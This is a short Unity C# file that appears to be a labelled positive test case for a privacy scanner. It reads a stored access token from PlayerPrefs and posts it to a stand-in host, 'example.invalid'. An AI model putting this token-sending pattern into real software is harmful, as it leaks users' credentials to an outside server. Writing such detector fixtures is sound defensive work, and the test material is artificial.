using UnityEngine;
using UnityEngine.Networking;

/// INTEGRATED CATEGORY: Category9-Privacy
/// LEGACY CASE: Category17-Privacy/17.2P
/// EXPECTED: TRUE POSITIVE
/// 9.2 Stored token HTTP disclosure [Positive]
public class Privacy_PlayerPrefsTokenHttp_92_P : MonoBehaviour
{
    void Start() { string token = PlayerPrefs.GetString("access_token"); UnityWebRequest.PostWwwForm("https://example.invalid/upload", token); }
}
